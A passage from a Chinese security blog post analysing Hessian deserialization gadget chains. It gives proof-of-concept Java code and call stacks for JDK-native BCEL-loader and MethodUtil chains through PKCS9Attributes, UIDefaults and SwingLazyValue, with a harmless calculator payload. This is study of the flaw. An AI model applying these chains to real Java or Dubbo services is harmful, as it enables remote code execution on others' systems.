<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getMethod:1783, Class (java.lang)</span><br><span class="line">runMain:114, JavaWrapper (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">createValue:73, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">getAttribute:265, PKCS9Attributes (sun.security.pkcs)</span><br><span class="line">toString:334, PKCS9Attributes (sun.security.pkcs)</span><br><span class="line">main:27, JDKGadgets (org.example)</span><br></pre></td></tr></table></figure>

<p>测试<code>demo</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">JavaClass cls = Repository.lookupClass(Evil.class);</span><br><span class="line">String code = Utility.encode(cls.getBytes(), true);</span><br><span class="line">//        System.out.println(code);</span><br><span class="line">PKCS9Attributes pkcs9Attributes = createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">UIDefaults uiDefaults = new UIDefaults();</span><br><span class="line">uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID,new</span><br><span class="line">	SwingLazyValue(&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;, &quot;_main&quot;,</span><br><span class="line">  new Object[]&#123;new String[]&#123;&quot;$$BCEL$$&quot; + code,&quot;s&quot;&#125;&#125;));</span><br><span class="line">setFieldValue(pkcs9Attributes,&quot;attributes&quot;,uiDefaults);</span><br><span class="line">pkcs9Attributes.toString();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Evil.java</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil &#123;</span><br><span class="line"></span><br><span class="line">    public static void _main(String[] argv) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里最后会调用静态的<code>_main</code>方法。</p>
<h4 id="MethodUtil-RCE-Gadgets"><a href="#MethodUtil-RCE-Gadgets" class="headerlink" title="MethodUtil RCE Gadgets"></a>MethodUtil RCE Gadgets</h4><p>还有另外一条Gadgets，通过调用<code>MethodUtil</code>的invoke来RCE：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PKCS9Attributes pkcs9Attributes = createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">UIDefaults uiDefaults = new UIDefaults();</span><br><span class="line">uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID,new</span><br><span class="line">SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;, &quot;invoke&quot;,</span><br><span class="line">	new Object[]&#123;</span><br><span class="line">		Class.forName(&quot;sun.reflect.misc.MethodUtil&quot;).getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class),</span><br><span class="line">  	new Object(), </span><br><span class="line">  	new Object[]&#123;</span><br><span class="line">  		Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class),</span><br><span class="line">  		Runtime.getRuntime(),</span><br><span class="line">  		new Object[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;&#125;&#125;));</span><br><span class="line">Reflections.setFieldValue(pkcs9Attributes,&quot;attributes&quot;,uiDefaults);</span><br><span class="line">pkcs9Attributes.toString();</span><br></pre></td></tr></table></figure>

<p>调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">exec:348, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invoke:71, Trampoline (sun.reflect.misc)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invoke:71, Trampoline (sun.reflect.misc)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">createValue:73, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">getAttribute:265, PKCS9Attributes (sun.security.pkcs)</span><br><span class="line">toString:338, PKCS9Attributes (sun.security.pkcs)</span><br></pre></td></tr></table></figure>

<p>总的来说，这两条Gadgets都用到了同一部分内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">createValue:73, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br></pre></td></tr></table></figure>

<p>然后通过PKCS9Attributes的toString执行到get方法，最终执行任意对象的静态方法。</p>
<h2 id="三、参考文章"><a href="#三、参考文章" class="headerlink" title="三、参考文章"></a>三、参考文章</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1814/">https://paper.seebug.org/1814/</a></p>
<p>marshalsec工具：<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>0ctf2022: <a target="_blank" rel="noopener" href="https://github.com/ceclin/0ctf-2022-soln-hessian-onlyjdk/tree/main/soln/src/main/kotlin/soln">https://github.com/ceclin/0ctf-2022-soln-hessian-onlyjdk/tree/main/soln/src/main/kotlin/soln</a></p>
<h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><p>​    Hessian反序列化的入口点为HashMap的equals方法或者hashcode方法。结合XString，可以扩展到任意对象的toString方法的调用。在Dubbo Hessian中，存在一些历史漏洞，例如CVE-2021-43297，可通过构造畸形的序列化数据，执行任意对象的toString方法。</p>

  </div>
</article>



      </div>
      
       <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets"><span class="toc-number">1.</span> <span class="toc-text">Hessian 反序列化 Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">一、Hessian反序列化流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets"><span class="toc-number">1.2.</span> <span class="toc-text">二、Hessian反序列化Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Rome-Gadgets"><span class="toc-number">1.2.1.</span> <span class="toc-text">（1）Rome Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Rome-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets"><span class="toc-number">1.2.2.</span> <span class="toc-text">（2）Rome 二次反序列化 Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89Resin-Gadgets"><span class="toc-number">1.2.3.</span> <span class="toc-text">（3）Resin Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89XBean-Gadgets"><span class="toc-number">1.2.4.</span> <span class="toc-text">（4）XBean Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89Spring-Partially-Comparable-Advisor-Holder-Gadgets"><span class="toc-number">1.2.5.</span> <span class="toc-text">（5）Spring Partially Comparable Advisor Holder Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89Spring-Abstract-Bean-Factory-Pointcut-Advisor-Gadgets"><span class="toc-number">1.2.6.</span> <span class="toc-text">（6）Spring Abstract Bean Factory Pointcut Advisor Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89JDK%E5%8E%9F%E7%94%9FGadgets"><span class="toc-number">1.2.7.</span> <span class="toc-text">（7）JDK原生Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%8A%A0%E8%BD%BD%E5%99%A8RCE-Gadgets"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">BCEL加载器RCE Gadgets</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MethodUtil-RCE-Gadgets"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">MethodUtil RCE Gadgets</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.3.</span> <span class="toc-text">三、参考文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B0%8F%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">四、小结</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&text=Hessian_反序列化_Gadgets"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&is_video=false&description=Hessian_反序列化_Gadgets"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hessian_反序列化_Gadgets&body=Check out this article: http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&title=Hessian_反序列化_Gadgets"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/09/Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Gadgets/&name=Hessian_反序列化_Gadgets&description=&lt;h1 id=&#34;Hessian-反序列化-Gadgets&#34;&gt;&lt;a href=&#34;#Hessian-反序列化-Gadgets&#34; class=&#34;headerlink&#34; title=&#34;Hessian 反序列化 Gadgets&#34;&gt;&lt;/a&gt;Hessian 反序列化 Gadgets&lt;/h1&gt;&lt;h2 id=&#34;一、Hessian反序列化流程&#34;&gt;&lt;a href=&#34;#一、Hessian反序列化流程&#34; class=&#34;headerlink&#34; title=&#34;一、Hessian反序列化流程&#34;&gt;&lt;/a&gt;一、Hessian反序列化流程&lt;/h2&gt;&lt;p&gt;这里简单描述一下Hessian的反序列化流程。&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

      
      <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2022 m1sn0w
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

      
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- Google Analytics -->

<!-- Disqus Comments -->


    </div>
</body>
</html>
